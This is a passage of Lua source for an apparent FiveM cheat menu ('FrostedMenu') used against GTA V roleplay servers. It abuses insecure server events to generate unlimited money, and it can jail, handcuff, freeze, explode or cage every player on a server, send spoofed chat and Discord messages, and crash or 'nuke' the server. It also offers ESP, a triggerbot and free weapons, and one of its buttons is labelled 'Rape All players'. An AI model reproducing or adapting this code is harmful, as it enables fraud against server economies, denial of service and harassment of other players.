                        'mecano',
                        function(ep, eq)
                            eq.close()
                        end
                    )
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'mecano',
                        function(er, es)
                            es.close()
                        end
                    )
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'mecano',
                        function(er, es)
                            es.close()
                        end
                    )
                    FrostedMenu.CloseMenu()
                elseif FrostedMenu.Button('~b~~h~Police~s~ Boss Menu') then
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'police',
                        function(en, eo)
                            eo.close()
                        end
                    )
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'police',
                        function(en, eo)
                            eo.close()
                        end
                    )
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'police',
                        function(ep, eq)
                            eq.close()
                        end
                    )
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'police',
                        function(ep, eq)
                            eq.close()
                        end
                    )
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'police',
                        function(er, es)
                            es.close()
                        end
                    )
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'police',
                        function(er, es)
                            es.close()
                        end
                    )
                    FrostedMenu.CloseMenu()
                elseif FrostedMenu.Button('~r~~h~Ambulance~s~ Boss Menu') then
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'ambulance',
                        function(en, eo)
                            eo.close()
                        end
                    )
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'ambulance',
                        function(en, eo)
                            eo.close()
                        end
                    )
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'ambulance',
                        function(ep, eq)
                            eq.close()
                        end
                    )
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'ambulance',
                        function(ep, eq)
                            eq.close()
                        end
                    )
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'ambulance',
                        function(er, es)
                            es.close()
                        end
                    )
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'ambulance',
                        function(er, es)
                            es.close()
                        end
                    )
                    FrostedMenu.CloseMenu()
                elseif FrostedMenu.Button('~y~~h~Taxi~s~ Boss Menu') then
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'taxi',
                        function(en, eo)
                            eo.close()
                        end
                    )
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'taxi',
                        function(en, eo)
                            eo.close()
                        end
                    )
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'taxi',
                        function(ep, eq)
                            eq.close()
                        end
                    )
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'taxi',
                        function(ep, eq)
                            eq.close()
                        end
                    )
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'taxi',
                        function(er, es)
                            es.close()
                        end
                    )
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'taxi',
                        function(er, es)
                            es.close()
                        end
                    )
                    FrostedMenu.CloseMenu()
                elseif FrostedMenu.Button('~g~~h~Real Estate~s~ Boss Menu') then
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'realestateagent',
                        function(en, eo)
                            FrostedMenu.close()
                        end
                    )
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'realestateagent',
                        function(en, eo)
                            FrostedMenu.close()
                        end
                    )
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'realestateagent',
                        function(ep, eq)
                            eq.close()
                        end
                    )
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'realestateagent',
                        function(ep, eq)
                            eq.close()
                        end
                    )
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'realestateagent',
                        function(er, es)
                            es.close()
                        end
                    )
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'realestateagent',
                        function(er, es)
                            es.close()
                        end
                    )
                    FrostedMenu.CloseMenu()
                elseif FrostedMenu.Button('~o~~h~Car Dealer~s~ Boss Menu') then
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'cardealer',
                        function(en, eo)
                            FrostedMenu.close()
                        end
                    )
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'cardealer',
                        function(en, eo)
                            FrostedMenu.close()
                        end
                    )
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'cardealer',
                        function(ep, eq)
                            eq.close()
                        end
                    )
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'cardealer',
                        function(ep, eq)
                            eq.close()
                        end
                    )
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'cardealer',
                        function(er, es)
                            es.close()
                        end
                    )
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'cardealer',
                        function(er, es)
                            es.close()
                        end
                    )
                    FrostedMenu.CloseMenu()
                elseif FrostedMenu.Button('~y~~h~Custom~s~ Boss Menu') then
                    local m = KeyboardInput('Enter custom boss menu job name', '', 100)
                    if m ~= '' then
                        TriggerEvent(
                            'esx_society:openBossMenu',
                            m,
                            function(en, eo)
                                FrostedMenu.close()
                            end
                        )
                        TriggerEvent(
                            'esx_society:openBossMenu',
                            m,
                            function(ep, eq)
                                eq.close()
                            end
                        )
                        TriggerEvent(
                            'esx_society:openBossMenu',
                            m,
                            function(er, es)
                                es.close()
                            end
                        )
                        FrostedMenu.CloseMenu()
                    end
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('ESXMoney') then
                if FrostedMenu.Button('~h~~o~Automatic Money ~r~ WARNING!') then
                    automaticmoneyesx()
                elseif FrostedMenu.Button('~g~~h~ESX ~y~Caution Give Back') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_jobs:caution', 'give_back', m)
                    end
                elseif FrostedMenu.Button('~g~~h~ESX ~y~Eden Garage') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent(
                            'eden_garage:payhealth',
                            {
                                costs = -m
                            }
                        )
                    end
                elseif FrostedMenu.Button('~g~~h~ESX ~y~Fuel Delivery') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_fueldelivery:pay', m)
                    end
                elseif FrostedMenu.Button('~g~~h~ESX ~y~Car Thief') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_carthief:pay', m)
                    end
                elseif FrostedMenu.Button('~g~~h~ESX ~y~DMV School') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent(
                            'esx_dmvschool:pay',
                            {
                                costs = -m
                            }
                        )
                    end
                elseif FrostedMenu.Button('~g~~h~FUEL ~y~Legacy Fuel') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent(
                            'LegacyFuel:PayFuel',
                            {
                                costs = -m
                            }
                        )
                    end
                elseif FrostedMenu.Button('~g~~h~ESX ~y~Dirty Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_godirtyjob:pay', m)
                    end
                elseif FrostedMenu.Button('~g~~h~ESX ~y~Pizza Boy') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_pizza:pay', m)
                    end
                elseif FrostedMenu.Button('~g~~h~ESX ~y~Ranger Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_ranger:pay', m)
                    end
                elseif FrostedMenu.Button('~g~~h~ESX ~y~Garbage Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_garbagejob:pay', m)
                    end
                elseif FrostedMenu.Button('~g~~h~ESX ~y~Car Thief ~r~DIRTY MONEY') then
                    local m = KeyboardInput('Enter amount of dirty money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_carthief:pay', m)
                    end
                elseif FrostedMenu.Button('~g~~h~ESX ~y~Trucker Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_truckerjob:pay', m)
                    end
                elseif FrostedMenu.Button('~g~~h~ESX ~y~Admin Give Bank') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('AdminMenu:giveBank', m)
                    end
                elseif FrostedMenu.Button('~g~~h~ESX ~y~Admin Give Cash') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('AdminMenu:giveCash', m)
                    end
                elseif FrostedMenu.Button('~g~~h~ESX ~y~Postal Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_gopostaljob:pay', m)
                    end
                elseif FrostedMenu.Button('~g~~h~ESX ~y~Banker Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_banksecurity:pay', m)
                    end
                elseif FrostedMenu.Button('~g~~h~ESX ~y~Slot Machine') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_slotmachine:sv:2', m)
                    end
                elseif
                    FrostedMenu.CheckBox(
                        '~g~~h~ESX Hunting~y~ reward',
                        huntspam,
                        function(dR)
                            huntspam = dR
                        end
                    )
                 then
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('ESXCustom') then
                if FrostedMenu.Button('~w~~h~Set hunger to ~h~~g~100') then
                    TriggerEvent('esx_status:set', 'hunger', 1000000)
                elseif FrostedMenu.Button('~w~~h~Set thirst to ~h~~g~100') then
                    TriggerEvent('esx_status:set', 'thirst', 1000000)
                elseif FrostedMenu.Button('~g~~h~ESX ~r~Revive') then
                    local f = KeyboardInput('Enter Player ID or all', '', 1000)
                    if f then
                        if f == 'all' then
                            for i = 0, 128 do
                                TriggerEvent('esx_ambulancejob:revive', GetPlayerServerId(i))
                                TriggerEvent('esx_ambulancejob:revive', GetPlayerServerId(i))
                            end
                        else
                            TriggerEvent('esx_ambulancejob:revive', f)
                            TriggerEvent('esx_ambulancejob:revive', f)
                        end
                    end
                elseif FrostedMenu.Button('~g~~h~ESX ~b~Handcuff') then
                    local f = KeyboardInput('Enter Player ID or all', '', 1000)
                    if f then
                        if f == 'all' then
                            for i = 0, 128 do
                                TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(i))
                                TriggerEvent('esx_policejob:handcuff', GetPlayerServerId(i))
                            end
                        else
                            TriggerEvent('esx_policejob:handcuff', f)
                            TriggerServerEvent('esx_policejob:handcuff', f)
                        end
                    end
                elseif FrostedMenu.Button('~h~Get Driving License') then
                    TriggerServerEvent('esx_dmvschool:addLicense', 'dmv')
                    TriggerServerEvent('esx_dmvschool:addLicense', 'drive')
                elseif FrostedMenu.Button('~h~~b~Buy ~s~a vehicle for ~g~free') then
                    cv()
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('ESXDrugs') then
                if FrostedMenu.Button('~h~~g~Harvest ~g~Weed') then
                    hweed()
                elseif FrostedMenu.Button('~h~~g~Transform ~g~Weed') then
                    tweed()
                elseif FrostedMenu.Button('~h~~g~Sell ~g~Weed') then
                    sweed()
                elseif FrostedMenu.Button('~h~~w~Harvest ~w~Coke') then
                    hcoke()
                elseif FrostedMenu.Button('~h~~w~Transform ~w~Coke') then
                    tcoke()
                elseif FrostedMenu.Button('~h~~w~Sell ~w~Coke') then
                    scoke()
                elseif FrostedMenu.Button('~h~~r~Harvest Meth') then
                    hmeth()
                elseif FrostedMenu.Button('~h~~r~Transform Meth') then
                    tmeth()
                elseif FrostedMenu.Button('~h~~r~Sell Meth') then
                    smeth()
                elseif FrostedMenu.Button('~h~~p~Harvest Opium') then
                    hopi()
                elseif FrostedMenu.Button('~h~~p~Transform Opium') then
                    topi()
                elseif FrostedMenu.Button('~h~~p~Sell Opium') then
                    sopi()
                elseif FrostedMenu.Button('~h~~g~Money Wash') then
                    mataaspalarufe()
                elseif FrostedMenu.Button('~r~~h~Stop all') then
                    matanumaispalarufe()
                elseif
                    FrostedMenu.CheckBox(
                        '~h~~r~Blow Drugs Up ~y~DANGER!',
                        BlowDrugsUp,
                        function(dR)
                            BlowDrugsUp = dR
                        end
                    )
                 then
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('VRPTriggers') then
                if FrostedMenu.Button('~r~~h~VRP ~s~Give Money ~ypayGarage') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent(
                            'lscustoms:payGarage',
                            {
                                costs = -m
                            }
                        )
                    end
                elseif FrostedMenu.Button('~r~~h~VRP ~g~WIN ~s~Slot Machine') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('vrp_slotmachine:server:2', m)
                    end
                elseif FrostedMenu.Button('~g~~h~FUEL ~y~Legacy Fuel') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent(
                            'LegacyFuel:PayFuel',
                            {
                                costs = -m
                            }
                        )
                    end
                elseif FrostedMenu.Button('~r~~h~VRP ~s~Get driving license') then
                    TriggerServerEvent('dmv:success')
                elseif FrostedMenu.Button('~r~~h~VRP ~s~Bank Deposit') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('Banca:deposit', m)
                        TriggerServerEvent('bank:deposit', m)
                    end
                elseif FrostedMenu.Button('~r~~h~VRP ~s~Bank Withdraw ') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('bank:withdraw', m)
                        TriggerServerEvent('Banca:withdraw', m)
                    end
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('MiscTriggers') then
                if FrostedMenu.Button('~h~Send Discord Message') then
                    local et = KeyboardInput('Enter message to send', '', 100)
                    TriggerServerEvent('DiscordBot:playerDied', et, '1337')
                    av('The message:~n~' .. et .. '~n~Has been ~g~sent!', true)
                elseif FrostedMenu.Button('~h~Send Fake Message') then
                    local eu = KeyboardInput('Enter player name', '', 100)
                    if eu then
                        local db = KeyboardInput('Enter message', '', 1000)
                        if db then
                            TriggerServerEvent(
                                '_chat:messageEntered',
                                eu,
                                {
                                    0,
                                    0x99,
                                    255
                                },
                                db
                            )
                        end
                    end
                elseif FrostedMenu.Button('~h~~g~ESX ~y~CarThief ~s~TROLL') then
                    av('~y~esx_carthief ~g~required', true)
                    av('~g~Trying to send alerts', false)
                    carthieftroll()
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('AdvM') then
                if FrostedMenu.MenuButton('~h~~p~>~s~ Destroyer Menu', 'Destroyer') then
                elseif FrostedMenu.MenuButton('~h~~p~>~s~ ESP Menu', 'ESPMenu') then
                elseif FrostedMenu.MenuButton('~h~~p~>~s~ Crosshairs', 'CsMenu') then
                elseif
                    FrostedMenu.CheckBox(
                        '~h~TriggerBot',
                        TriggerBot,
                        function(dR)
                            TriggerBot = dR
                        end
                    )
                 then
                elseif
                    FrostedMenu.CheckBox(
                        '~h~Player Blips',
                        dx,
                        function(dx)
                        end
                    )
                 then
                    cL = not cL
                    dx = cL
                elseif
                    FrostedMenu.CheckBox(
                        '~h~Name Above Players ~g~v1',
                        cM,
                        function(dR)
                            cM = dR
                            cN = false
                        end
                    )
                 then
                elseif
                    FrostedMenu.CheckBox(
                        '~h~Name Above Players n Indicator ~g~v2',
                        cN,
                        function(dR)
                            cN = dR
                            cM = false
                        end
                    )
                 then
                elseif
                    FrostedMenu.CheckBox(
                        '~h~~r~Freeze~s~ All players',
                        freezeall,
                        function(dR)
                            freezeall = dR
                        end
                    )
                 then
                elseif
                    FrostedMenu.CheckBox(
                        '~h~~r~Explode~s~ All players',
                        blowall,
                        function(dR)
                            blowall = dR
                        end
                    )
                 then
                elseif FrostedMenu.Button('~h~~r~BORGAR~s~ Everyone') then
                    for i = 0, 128 do
                        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                            local eb = 'xs_prop_hamburgher_wl'
                            local ec = GetHashKey(eb)
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                RequestModel(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetVehiclePedIsIn(GetPlayerPed(i), false),
                                GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        else
                            local eb = 'xs_prop_hamburgher_wl'
                            local ec = GetHashKey(eb)
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                RequestModel(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetPlayerPed(i),
                                GetPedBoneIndex(GetPlayerPed(i), 0),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        end
                    end
                elseif FrostedMenu.Button('~h~~o~Discord RPC~s~ Add/Remove') then
                    h = not h
                    if not h then
                        SetRichPresence(0)
                        SetDiscordAppId(0)
                        SetDiscordRichPresenceAsset(0)
                        SetDiscordRichPresenceAssetText(0)
                    else
                        e()
                    end
                elseif
                    FrostedMenu.CheckBox(
                        '~h~~r~Ra~g~nd~b~om ~s~Notification Color',
                        rgbnot,
                        function(dR)
                            rgbnot = dR
                        end
                    )
                 then
                elseif
                    FrostedMenu.CheckBox(
                        '~h~~r~Confirms~s~ masterswitch',
                        cO,
                        function(dR)
                            cO = dR
                        end
                    )
                 then
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('CsMenu') then
                if
                    FrostedMenu.CheckBox(
                        '~h~~y~Original ~s~Crosshair',
                        crosshair,
                        function(dR)
                            crosshair = dR
                            crosshairc = false
                            crosshairc2 = false
                        end
                    )
                 then
                elseif
                    FrostedMenu.CheckBox(
                        '~h~~r~CROSS ~s~Crosshair',
                        crosshairc,
                        function(dR)
                            crosshair = false
                            crosshairc = dR
                            crosshairc2 = false
                        end
                    )
                 then
                elseif
                    FrostedMenu.CheckBox(
                        '~h~~r~DOT ~s~Crosshair',
                        crosshairc2,
                        function(dR)
                            crosshair = false
                            crosshairc = false
                            crosshairc2 = dR
                        end
                    )
                 then
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('Destroyer') then
                if FrostedMenu.Button('~h~~r~Nuke ~s~Server') then
                    nukeserver()
                elseif
                    FrostedMenu.CheckBox(
                        '~h~~r~Silent ~s~Server ~y~Crasher',
                        servercrasherxd,
                        function(dR)
                            servercrasherxd = dR
                        end
                    )
                 then
                elseif FrostedMenu.Button('~h~~g~ESX ~r~Destroy ~b~v2') then
                    esxdestroyv2()
                elseif FrostedMenu.Button('~h~~g~ESX ~r~Destroy ~b~Salary') then
                    EconomyDy2()
                elseif FrostedMenu.Button('~h~~r~VRP ~s~Give everyone money') then
                    vrpdestroy()
                elseif FrostedMenu.Button('~h~~g~ESX ~s~Give everyone money') then
                    giveeveryone()
                elseif FrostedMenu.Button('~h~~p~Byte-Jail~s~ All players') then
                    for i = 0, 128 do
                    TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 3000)
                    TriggerEvent('esx_jailer:wysylandoo', GetPlayerServerId(i), 3000000000)
                    TriggerServerEvent("esx_jailer:sendToJailf", GetPlayerServerId(i), 9937, "SHADOW MENU | KOCHAM WAS <3", 9999999999)
                    TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "SHADOW MENU | KOCHAM WAS <3", 9999999999)
                    TriggerServerEvent("esx-jail:jailPlayer",   GetPlayerServerId(i), 3000)
                    TriggerServerEvent("esx_jailer:jailhype", GetPlayerServerId(i), 3000)
                    TriggerServerEvent("esx_jailer:sendToJial", GetPlayerServerId(i), 59999, "SHADOW MENU | KOCHAM WAS <3", 9333397)
                    TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 59999, "SHADOW MENU | KOCHAM WAS <3", 9333397)
                    TriggerServerEvent("esx-jail:jailPlayer", GetPlayerServerId(i), 9937, "SHADOW MENU | KOCHAM WAS <3", 9999999999)
                    TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "SHADOW MENU | KOCHAM WAS <3", 9999999999)
                    TriggerServerEvent("hazerp:wyslijdopaki", GetPlayerServerId(i), 5000, "SHADOW MENU | KOCHAM WAS <3")
                    TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "SHADOW MENU | KOCHAM WAS <3")
                    TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 50000)
                    TriggerServerEvent("8321hiue89js", GetPlayerServerId(i), 5007, "SHADOW MENU | KOCHAM WAS <3", 323434532532, securityToken)
                    TriggerServerEvent("esx_jailer:sendToJailjebacdisafrajerze", GetPlayerServerId(i), 300000, "SHADOW MENU | KOCHAM WAS <3", 500324532)
                    TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 5000, "SHADOW MENU | KOCHAM WAS <3")
                    TriggerServerEvent("esx-qalle-jail:Wiezienie", GetPlayerServerId(i), 999999999 * 60, "SHADOW MENU | KOCHAM WAS <3")
                    TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 5000, "SHADOW MENU | KOCHAM WAS <3")
                    TriggerServerEvent('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName(PlayerId()) .." SHADOW MENU | KOCHAM WAS <3")
                    end
                elseif FrostedMenu.Button('~h~~r~Banana ~p~Party~s~ All players') then
                    bananapartyall()
                elseif FrostedMenu.Button('~h~~r~Rape~s~ All players') then
                    RapeAllFunc()
                elseif FrostedMenu.Button('~h~~r~Cage~s~ All players') then
                    for i = 0, 255 do
                        x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(i)))
                        roundx = tonumber(string.format('%.2f', x))
                        roundy = tonumber(string.format('%.2f', y))
                        roundz = tonumber(string.format('%.2f', z))
                        while not HasModelLoaded(GetHashKey('prop_fnclink_05crnr1')) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey('prop_fnclink_05crnr1'))
                        end
                        local e9 =
                            CreateObject(
                            GetHashKey('prop_fnclink_05crnr1'),
                            roundx - 1.70,
                            roundy - 1.70,
                            roundz - 1.0,
                            true,
                            true,
                            false
                        )
                        local ea =
                            CreateObject(
                            GetHashKey('prop_fnclink_05crnr1'),
                            roundx + 1.70,
                            roundy + 1.70,
                            roundz - 1.0,
                            true,
                            true,
                            false
                        )
                        SetEntityHeading(e9, -90.0)
                        SetEntityHeading(ea, 90.0)
                        FreezeEntityPosition(e9, true)
                        FreezeEntityPosition(ea, true)
                    end
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('crds') then
                if FrostedMenu.Button('~h~~p~>~s~ b00mek~r~#~r~0001 ~p~FROSTED') then
                elseif FrostedMenu.Button('~h~~p~>~s~ lilabyte~r~#~r~5010 ~p~FROSTED') then
                elseif FrostedMenu.Button('~h~~p~>~s~ xaries~r~#~r~2300 ~p~FROSTED') then
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('WeaponTypes') then
                for e0, ev in pairs(b7) do
                    if FrostedMenu.MenuButton('~h~~p~>~s~ ' .. e0, 'WeaponTypeSelection') then
                        dy = ev
                    end
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('WeaponTypeSelection') then
                for e0, ev in pairs(dy) do
                    if FrostedMenu.MenuButton(ev.name, 'WeaponOptions') then
                        dz = ev
                    end
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('WeaponOptions') then
                if FrostedMenu.Button('~h~~r~Spawn Weapon') then
                    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey(dz.id), 1000, false)
                end
                if FrostedMenu.Button('~h~~g~Add Ammo') then
                    SetPedAmmo(GetPlayerPed(-1), GetHashKey(dz.id), 5000)
                end
                if
                    FrostedMenu.CheckBox(
                        '~h~~r~Infinite ~s~Ammo',
                        dz.bInfAmmo,
                        function(ew)
                        end
                    )
                 then
                    dz.bInfAmmo = not dz.bInfAmmo
                    SetPedInfiniteAmmo(GetPlayerPed(-1), dz.bInfAmmo, GetHashKey(dz.id))
                    SetPedInfiniteAmmoClip(GetPlayerPed(-1), true)
                    PedSkipNextReloading(GetPlayerPed(-1))
                    SetPedShootRate(GetPlayerPed(-1), 1000)
                end
                for e0, ev in pairs(dz.mods) do
                    if FrostedMenu.MenuButton('~h~~p~>~s~ ~h~~r~> ~s~' .. e0, 'ModSelect') then
                        dA = ev
                    end
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('ModSelect') then
                for _, ev in pairs(dA) do
                    if FrostedMenu.Button(ev.name) then
                        GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey(dz.id), GetHashKey(ev.id))
                    end
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('CarTypes') then
                for i, ex in ipairs(b3) do
                    if FrostedMenu.MenuButton('~h~~p~>~s~ ' .. ex, 'CarTypeSelection') then
                        carTypeIdx = i
                    end
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('CarTypeSelection') then
                for i, ex in ipairs(b4[carTypeIdx]) do
                    if FrostedMenu.MenuButton('~h~~p~>~s~ ~h~~r~>~s~ ' .. ex, 'CarOptions') then
                        carToSpawn = i
                    end
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('CarOptions') then
                if FrostedMenu.Button('~h~~r~Spawn Car') then
                    local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                    local veh = b4[carTypeIdx][carToSpawn]
                    if veh == nil then
                        veh = 'adder'
                    end
                    vehiclehash = GetHashKey(veh)
                    RequestModel(vehiclehash)
                    Citizen.CreateThread(
                        function()
                            local ey = 0
                            while not HasModelLoaded(vehiclehash) do
                                ey = ey + 100
                                Citizen.Wait(100)
                                if ey > 5000 then
                                    ShowNotification('~h~~r~Cannot spawn this vehicle.')
                                    break
                                end
                            end
                            SpawnedCar =
                                CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0)
                            SetVehicleStrong(SpawnedCar, true)
                            SetVehicleEngineOn(SpawnedCar, true, true, false)
                            SetVehicleEngineCanDegrade(SpawnedCar, false)
                        end
                    )
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('MainTrailer') then
                if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                    for i, ex in ipairs(b5) do
                        if FrostedMenu.MenuButton('~h~~p~>~s~ ~h~~r~>~s~ ' .. ex, 'MainTrailerSpa') then
                            TrailerToSpawn = i
                        end
                    end
                else
                    av('~h~~w~Not in a vehicle', true)
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('MainTrailerSpa') then
                if FrostedMenu.Button('~h~~r~Spawn Car') then
                    local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                    local veh = b5[TrailerToSpawn]
                    if veh == nil then
                        veh = 'adder'
                    end
                    vehiclehash = GetHashKey(veh)
                    RequestModel(vehiclehash)
                    Citizen.CreateThread(
                        function()
                            local ey = 0
                            while not HasModelLoaded(vehiclehash) do
                                ey = ey + 100
                                Citizen.Wait(100)
                                if ey > 5000 then
                                    ShowNotification('~h~~r~Cannot spawn this vehicle.')
                                    break
                                end
                            end
                            local SpawnedCar =
                                CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0)
                            local ez = GetVehiclePedIsUsing(GetPlayerPed(-1))
                            AttachVehicleToTrailer(Usercar, SpawnedCar, 50.0)
                            SetVehicleStrong(SpawnedCar, true)
                            SetVehicleEngineOn(SpawnedCar, true, true, false)
                            SetVehicleEngineCanDegrade(SpawnedCar, false)
                        end
                    )
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('GiveSingleWeaponPlayer') then
                for i = 1, #b6 do
                    if FrostedMenu.Button(b6[i]) then
                        GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(b6[i]), 1000, false, true)
                    end
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('ESPMenu') then
                if
                    FrostedMenu.CheckBox(
                        '~h~~r~ESP ~s~MasterSwitch',
                        esp,
                        function(dR)
                            esp = dR
                        end
                    )
                 then
                elseif
                    FrostedMenu.CheckBox(
                        '~h~~r~ESP ~s~Box',
                        espbox,
                        function(dR)
                            espbox = dR
                        end
                    )
                 then
                elseif
                    FrostedMenu.CheckBox(
                        '~h~~r~ESP ~s~Info',
                        espinfo,
                        function(dR)
                            espinfo = dR
                        end
                    )
                 then
                elseif
                    FrostedMenu.CheckBox(
                        '~h~~r~ESP ~s~Lines',
                        esplines,
                        function(dR)
                            esplines = dR
                        end
                    )
                 then
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('LSC') then
                local veh = GetVehiclePedIsUsing(PlayerPedId())
                if FrostedMenu.MenuButton('~h~~p~>~s~ ~h~~r~Exterior ~s~Tuning', 'tunings') then
                elseif FrostedMenu.MenuButton('~h~~p~>~s~ ~h~~r~Performance ~s~Tuning', 'performance') then
                elseif FrostedMenu.Button('~h~Change Car License Plate') then
                    cu()
                elseif
                    FrostedMenu.CheckBox(
                        '~h~~g~R~r~a~y~i~b~n~o~b~r~o~g~w ~s~Vehicle Colour',
                        RainbowVeh,
                        function(dR)
                            RainbowVeh = dR
                        end
                    )
                 then
